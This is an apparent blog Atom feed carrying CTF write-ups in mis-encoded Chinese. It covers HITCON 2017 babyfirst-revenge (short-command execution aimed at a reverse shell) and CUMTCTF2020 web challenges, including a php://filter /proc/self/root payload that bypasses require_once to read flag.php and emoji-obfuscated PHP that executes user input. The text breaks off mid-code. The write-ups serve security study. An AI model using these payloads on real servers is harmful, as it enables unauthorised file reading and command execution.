<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Pz1o</title>
  
  <subtitle>Pz1o</subtitle>
  <link href="https://pz1o.top/atom.xml" rel="self"/>
  
  <link href="https://pz1o.top/"/>
  <updated>2020-11-20T14:19:52.357Z</updated>
  <id>https://pz1o.top/</id>
  
  <author>
    <name>Pz1o</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>å¤ç°wp</title>
    <link href="https://pz1o.top/2099/09/28/%E5%A4%8D%E7%8E%B0wp/"/>
    <id>https://pz1o.top/2099/09/28/%E5%A4%8D%E7%8E%B0wp/</id>
    <published>2099-09-28T02:18:17.000Z</published>
    <updated>2020-11-20T14:19:52.357Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h2 id="Hitcon2017-babyfirst-reveng"><a href="#Hitcon2017-babyfirst-reveng" class="headerlink" title="Hitcon2017 babyfirst-reveng"></a>Hitcon2017 babyfirst-reveng</h2><p>githubå¤ç°åœ°å€</p><p><a href="https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge" target="_blank" rel="noopener">https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge</a></p><h3 id="è€ƒç‚¹"><a href="#è€ƒç‚¹" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h3><p>å‘½ä»¤æ‰§è¡Œæ„é€ åå¼¹shell</p><p>æºç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>å…ˆè¯´å‡ ä¸ªçŸ¥è¯†ç‚¹ï¼š</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;e\</span><br><span class="line">&gt;cho\</span><br><span class="line">&#39;123&#39;</span><br><span class="line">&gt;123</span><br></pre></td></tr></table></figure><p>åœ¨linuxä¸­æ¢è¡Œå¯ä»¥æ‰§è¡Œé—´æ–­çš„å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># vi 1  //åœ¨1ä¸‹å†™å…¥cat flag.txt</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># touch flag.txt</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># echo "cumtctf&#123;i_am_so_cute&#125;" &gt;&gt; flag.txt</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># cat flag.txt</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">cumtctf&#123;i_am_so_cute&#125;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># sh 1</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">cumtctf&#123;i_am_so_cute&#125;</span></span><br></pre></td></tr></table></figure><p>åœ¨Linuxä¸‹é¢å¯ä»¥é€šè¿‡å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶é‡Œé¢çš„å†…å®¹æ˜¯ç³»ç»Ÿå‘½ä»¤ï¼Œç„¶åå¯ä»¥é€šè¿‡<code>sh filename</code>æ¥æ‰§è¡Œæ–‡æœ¬é‡Œé¢çš„ç³»ç»Ÿå‘½ä»¤ï¼Œå¦‚æœæœ‰æŠ¥é”™çš„è¯ä¼šè‡ªåŠ¨è·³è¿‡</p></blockquote><h1 id="CUMTCTF2020"><a href="#CUMTCTF2020" class="headerlink" title="CUMTCTF2020"></a>CUMTCTF2020</h1><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ç®€å•çš„æ–‡ä»¶åŒ…å«ï¼Ÿ"><a href="#ç®€å•çš„æ–‡ä»¶åŒ…å«ï¼Ÿ" class="headerlink" title="ç®€å•çš„æ–‡ä»¶åŒ…å«ï¼Ÿ"></a>ç®€å•çš„æ–‡ä»¶åŒ…å«ï¼Ÿ</h2><h3 id="è€ƒç‚¹-1"><a href="#è€ƒç‚¹-1" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h3><p>require_onceç»•è¿‡</p><p>æºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>] != <span class="string">'127.0.0.1'</span> &amp;&amp; $_SERVER[<span class="string">'HTTP_X_REAL_IP'</span>] != <span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] == <span class="string">"127.0.0.1"</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Do u think that I dont know X-Forwarded-For?&lt;br&gt;Too young too simple sometimes naive"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Sorry, this site is only optimized for those who comes from localhost"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'f'</span>])) </span><br><span class="line">  <span class="keyword">include_once</span>($_POST[<span class="string">'f'</span>]);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸»è¦é—®é¢˜æ˜¯<code>reuqire_once</code>çš„é—®é¢˜</p><p><a href="https://www.anquanke.com/post/id/213235#h3-2" target="_blank" rel="noopener">https://www.anquanke.com/post/id/213235#h3-2</a></p><p>è¿™é‡Œé¢çš„æºç è§£ææœ‰å¾—è¿˜æ˜¯çœ‹ä¸æ‡‚ï¼Œæ—¥åå†ç¿»</p><p>é¦–å…ˆè¯´ä¸€ä¸‹phpæ–‡ä»¶åŒ…å«çš„æœºåˆ¶æ˜¯å°†<strong>å·²ç»åŒ…å«çš„æ–‡ä»¶ä¸æ–‡ä»¶çš„çœŸå®è·¯å¾„æ”¾è¿›å“ˆå¸Œè¡¨ä¸­</strong>ï¼Œå½“å·²ç»<code>require_once(&#39;flag.php&#39;)</code>ï¼Œå·²ç»includeçš„æ–‡ä»¶ä¸å¯ä»¥å†<code>require_once</code>ã€‚</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br></pre></td></tr></table></figure><blockquote><p>/proc/selfæŒ‡å‘å½“å‰è¿›ç¨‹çš„/proc/pid/</p><p>/proc/self/root/æŒ‡å‘/çš„ç¬¦å·</p><p><img src="/2099/09/28/%E5%A4%8D%E7%8E%B0wp/image-20200928111221260.png" alt></p></blockquote><h2 id="ğŸ‘ğŸ™ŒğŸ˜ƒ"><a href="#ğŸ‘ğŸ™ŒğŸ˜ƒ" class="headerlink" title="ğŸ‘ğŸ™ŒğŸ˜ƒ"></a>ğŸ‘ğŸ™ŒğŸ˜ƒ</h2><h3 id="è€ƒç‚¹-2"><a href="#è€ƒç‚¹-2" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h3><p>ä»£ç æ ¼å¼åŒ–ã€åæ··æ·†ï¼Œbcryptçˆ†ç ´ï¼Œ<strong>å‘½ä»¤æ‰§è¡Œ</strong></p><p>è¿™ä¸ªé¢˜ æˆ‘åªèƒ½è¯´çœŸçš„ç‰›é€¼</p><p>çœŸçš„å¼€çœ¼ç•Œ è¿˜å¯ä»¥è¿™æ ·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Bcrypt</span>\<span class="title">Bcrypt</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>,<span class="string">"Off"</span>);</span><br><span class="line">$ğŸ™=<span class="keyword">array</span>(<span class="string">'ğŸ™'</span>,<span class="string">'ğŸ™‘'</span>,<span class="string">'ğŸ™’'</span>,<span class="string">'ğŸ™“'</span>,<span class="string">'ğŸ™”'</span>,<span class="string">'ğŸ™•'</span>,<span class="string">'ğŸ™–'</span>,<span class="string">'ğŸ™—'</span>,<span class="string">'ğŸ™˜'</span>,<span class="string">'ğŸ™™'</span>,<span class="string">'ğŸ™š'</span>,<span class="string">'ğŸ™›'</span>,<span class="string">'ğŸ™œ'</span>,<span class="string">'ğŸ™'</span>,<span class="string">'ğŸ™'</span>,<span class="string">'ğŸ™Ÿ'</span>);</span><br><span class="line">$ğŸ™ =<span class="keyword">array</span>(<span class="string">'ğŸ™ '</span>,<span class="string">'ğŸ™¡'</span>,<span class="string">'ğŸ™¢'</span>,<span class="string">'ğŸ™£'</span>,<span class="string">'ğŸ™¤'</span>,<span class="string">'ğŸ™¥'</span>,<span class="string">'ğŸ™¦'</span>,<span class="string">'ğŸ™§'</span>,<span class="string">'ğŸ™¨'</span>,<span class="string">'ğŸ™©'</span>,<span class="string">'ğŸ™ª'</span>,<span class="string">'ğŸ™«'</span>,<span class="string">'ğŸ™¬'</span>,<span class="string">'ğŸ™­'</span>,<span class="string">'ğŸ™®'</span>,<span class="string">'ğŸ™¯'</span>);</span><br><span class="line">$ğŸ™°=<span class="keyword">array</span>(<span class="string">'ğŸ™°'</span>,<span class="string">'ğŸ™±'</span>,<span class="string">'ğŸ™²'</span>,<span class="string">'ğŸ™³'</span>,<span class="string">'ğŸ™´'</span>,<span class="string">'ğŸ™µ'</span>,<span class="string">'ğŸ™¶'</span>,<span class="string">'ğŸ™·'</span>,<span class="string">'ğŸ™¸'</span>,<span class="string">'ğŸ™¹'</span>,<span class="string">'ğŸ™º'</span>,<span class="string">'ğŸ™»'</span>,<span class="string">'ğŸ™¼'</span>,<span class="string">'ğŸ™½'</span>,<span class="string">'ğŸ™¾'</span>,<span class="string">'ğŸ™¿'</span>);</span><br><span class="line">$ğŸ˜€=<span class="keyword">array</span>(<span class="string">'ğŸ˜€'</span>,<span class="string">'ğŸ˜'</span>,<span class="string">'ğŸ˜‚'</span>,<span class="string">'ğŸ˜ƒ'</span>,<span class="string">'ğŸ˜„'</span>,<span class="string">'ğŸ˜…'</span>,<span class="string">'ğŸ˜†'</span>,<span class="string">'ğŸ˜‡'</span>,<span class="string">'ğŸ˜ˆ'</span>,<span class="string">'ğŸ˜‰'</span>,<span class="string">'ğŸ˜Š'</span>,<span class="string">'ğŸ˜‹'</span>,<span class="string">'ğŸ˜Œ'</span>,<span class="string">'ğŸ˜'</span>,<span class="string">'ğŸ˜'</span>,<span class="string">'ğŸ˜'</span>);</span><br><span class="line">$ğŸ˜=<span class="keyword">array</span>(<span class="string">'ğŸ˜'</span>,<span class="string">'ğŸ˜‘'</span>,<span class="string">'ğŸ˜’'</span>,<span class="string">'ğŸ˜“'</span>,<span class="string">'ğŸ˜”'</span>,<span class="string">'ğŸ˜•'</span>,<span class="string">'ğŸ˜–'</span>,<span class="string">'ğŸ˜—'</span>,<span class="string">'ğŸ˜˜'</span>,<span class="string">'ğŸ˜™'</span>,<span class="string">'ğŸ˜š'</span>,<span class="string">'ğŸ˜›'</span>,<span class="string">'ğŸ˜œ'</span>,<span class="string">'ğŸ˜'</span>,<span class="string">'ğŸ˜'</span>,<span class="string">'ğŸ˜Ÿ'</span>);</span><br><span class="line">$ğŸ˜ =<span class="keyword">array</span>(<span class="string">'ğŸ˜ '</span>,<span class="string">'ğŸ˜¡'</span>,<span class="string">'ğŸ˜¢'</span>,<span class="string">'ğŸ˜£'</span>,<span class="string">'ğŸ˜¤'</span>,<span class="string">'ğŸ˜¥'</span>,<span class="string">'ğŸ˜¦'</span>,<span class="string">'ğŸ˜§'</span>,<span class="string">'ğŸ˜¨'</span>,<span class="string">'ğŸ˜©'</span>,<span class="string">'ğŸ˜ª'</span>,<span class="string">'ğŸ˜«'</span>,<span class="string">'ğŸ˜¬'</span>,<span class="string">'ğŸ˜­'</span>,<span class="string">'ğŸ˜®'</span>,<span class="string">'ğŸ˜¯'</span>);</span><br><span class="line">$ğŸ˜°=<span class="keyword">array</span>(<span class="string">'ğŸ˜°'</span>,<span class="string">'ğŸ˜±'</span>,<span class="string">'ğŸ˜²'</span>,<span class="string">'ğŸ˜³'</span>,<span class="string">'ğŸ˜´'</span>,<span class="string">'ğŸ˜µ'</span>,<span class="string">'ğŸ˜¶'</span>,<span class="string">'ğŸ˜·'</span>,<span class="string">'ğŸ˜¸'</span>,<span class="string">'ğŸ˜¹'</span>,<span class="string">'ğŸ˜º'</span>,<span class="string">'ğŸ˜»'</span>,<span class="string">'ğŸ˜¼'</span>,<span class="string">'ğŸ˜½'</span>,<span class="string">'ğŸ˜¾'</span>,<span class="string">'ğŸ˜¿'</span>);</span><br><span class="line">$ğŸ™€=<span class="keyword">array</span>(<span class="string">'ğŸ™€'</span>,<span class="string">'ğŸ™'</span>,<span class="string">'ğŸ™‚'</span>,<span class="string">'ğŸ™ƒ'</span>,<span class="string">'ğŸ™„'</span>,<span class="string">'ğŸ™…'</span>,<span class="string">'ğŸ™†'</span>,<span class="string">'ğŸ™‡'</span>,<span class="string">'ğŸ™ˆ'</span>,<span class="string">'ğŸ™‰'</span>,<span class="string">'ğŸ™Š'</span>,<span class="string">'ğŸ™‹'</span>,<span class="string">'ğŸ™Œ'</span>,<span class="string">'ğŸ™'</span>,<span class="string">'ğŸ™'</span>,<span class="string">'ğŸ™'</span>);</span><br><span class="line">$ğŸ = <span class="keyword">array</span>($ğŸ™ ,$ğŸ™ ,$ğŸ™°,$ğŸ˜€,$ğŸ˜,$ğŸ˜ ,$ğŸ˜°,$ğŸ™€);</span><br><span class="line">$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™… = <span class="string">"strlen"</span>;</span><br><span class="line">$ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ™‰ = <span class="string">"chr"</span>;</span><br><span class="line">$ğŸ = <span class="string">"base64_decode"</span>;</span><br><span class="line">$ğŸ˜±ğŸ˜¨ğŸ˜ğŸ™ŠğŸ˜ªğŸ˜¨ğŸ˜¡ğŸ˜ = <span class="string">"isset"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼<span class="params">($ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰)</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $ğŸ,$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…,$ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ™‰,$ğŸ,$ğŸ˜±ğŸ˜¨ğŸ˜ğŸ™ŠğŸ˜ªğŸ˜¨ğŸ˜¡ğŸ˜;</span><br><span class="line">$ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…= (<span class="string">"$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…"</span>)($ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰)/<span class="number">4</span>;</span><br><span class="line">$ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼ = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span> ($ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€ = <span class="number">0</span>;$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€&lt;$ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…;$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€++) &#123;</span><br><span class="line">$ğŸ˜©ğŸ˜‚ğŸ˜¦ğŸ™ƒ =$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*<span class="number">4</span>].$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*<span class="number">4</span>+<span class="number">1</span>].$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*<span class="number">4</span>+<span class="number">2</span>].$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*<span class="number">4</span>+<span class="number">3</span>];</span><br><span class="line">$ğŸ˜ªğŸ˜¾ğŸ˜ğŸ˜€ =<span class="number">0</span>;</span><br><span class="line">$ğŸ˜³ğŸ˜‚ğŸ˜¦ğŸ˜º =<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ($ğŸ˜±ğŸ˜½ğŸ™€ğŸ™ =<span class="number">0</span>;$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™&lt;<span class="number">8</span>;$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™++) &#123;</span><br><span class="line"><span class="keyword">for</span> ($ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚=<span class="number">0</span>;$ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚&lt;<span class="number">16</span>;$ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚++) &#123;</span><br><span class="line"><span class="keyword">if</span>($ğŸ˜©ğŸ˜‚ğŸ˜¦ğŸ™ƒ == $ğŸ[$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™][$ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚]) &#123;</span><br><span class="line">$ğŸ˜ªğŸ˜¾ğŸ˜ğŸ˜€=$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™;</span><br><span class="line">$ğŸ˜³ğŸ˜‚ğŸ˜¦ğŸ˜º = $ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$ğŸ˜²ğŸ˜¾ğŸ˜¦ğŸ™„ = $ğŸ˜ªğŸ˜¾ğŸ˜ğŸ˜€*<span class="number">16</span>+$ğŸ˜³ğŸ˜‚ğŸ˜¦ğŸ˜º;</span><br><span class="line">$ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼ = $ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼.(<span class="string">"$ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ™‰"</span>)($ğŸ˜²ğŸ˜¾ğŸ˜¦ğŸ™„);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> (<span class="string">"$ğŸ"</span>)($ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> ğŸ˜ğŸ˜<span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $ğŸ,$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…,$ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ™‰,$ğŸ,$ğŸ˜±ğŸ˜¨ğŸ˜ğŸ™ŠğŸ˜ªğŸ˜¨ğŸ˜¡ğŸ˜;</span><br><span class="line">$ğŸ˜³ğŸ˜‚ğŸ˜–ğŸ™…ğŸ˜ªğŸ˜—ğŸ˜š = ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜œğŸ˜ƒğŸ˜ªğŸ˜¸ğŸ˜³ğŸ˜¹ğŸ˜‰ğŸ˜ƒğŸ˜´ğŸ˜ƒğŸ˜³ğŸ™†ğŸ˜±ğŸ˜˜ğŸ˜¢ğŸ™„ğŸ˜²ğŸ˜“ğŸ˜‰ğŸ™ŠğŸ˜©ğŸ˜§ğŸ˜…ğŸ˜»ğŸ˜©ğŸ˜½ğŸ˜‰ğŸ˜„ğŸ˜œğŸ™‡ğŸ˜ğŸ˜).ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜²ğŸ˜§ğŸ˜¡ğŸ˜)($_SERVER[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜¥ğŸ˜»ğŸ˜¦ğŸ˜ğŸ˜¤ğŸ˜ğŸ˜¢ğŸ˜–ğŸ˜¨ğŸ˜€ğŸ˜–ğŸ˜•ğŸ˜¢ğŸ˜–ğŸ˜™ğŸ˜)]);</span><br><span class="line">ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜²ğŸ˜§ğŸ™„ğŸ˜»ğŸ˜±ğŸ˜¨ğŸ˜™ğŸ˜)($ğŸ˜³ğŸ˜‚ğŸ˜–ğŸ™…ğŸ˜ªğŸ˜—ğŸ˜š);</span><br><span class="line">ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ˜»ğŸ˜±ğŸ˜¨ğŸ˜™ğŸ˜)($ğŸ˜³ğŸ˜‚ğŸ˜–ğŸ™…ğŸ˜ªğŸ˜—ğŸ˜š);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜©ğŸ˜‚ğŸ˜ğŸ˜»)]) &amp;&amp; ($ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…)($_GET[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜©ğŸ˜‚ğŸ˜ğŸ˜»)]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">@ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜ªğŸ˜¨ğŸ˜¸ğŸ˜¼ğŸ˜©ğŸ™‡ğŸ˜ğŸ˜)($_GET[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜©ğŸ˜‚ğŸ˜ğŸ˜»)]);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜³ğŸ˜½ğŸ˜¦ğŸ™ŠğŸ˜ªğŸ˜¨ğŸ˜¡ğŸ˜)])) &#123;</span><br><span class="line">@ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜ªğŸ˜¨ğŸ˜¸ğŸ˜¼ğŸ˜©ğŸ™‡ğŸ˜ğŸ˜)(ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜³ğŸ˜½ğŸ˜€ğŸ˜·ğŸ˜œğŸ˜¨ğŸ˜šğŸ˜½ğŸ˜™ğŸ˜‘ğŸ˜ğŸ˜) . $ğŸ˜³ğŸ˜‚ğŸ˜–ğŸ™…ğŸ˜ªğŸ˜—ğŸ˜š);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$ğŸ¯ = <span class="keyword">new</span> Bcrypt();</span><br><span class="line">$ğŸ”‘ = $_POST[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜³ğŸ˜—ğŸ˜–ğŸ™ŠğŸ˜³ğŸ˜ƒğŸ˜´ğŸ˜»)];</span><br><span class="line">$ğŸ”’ = 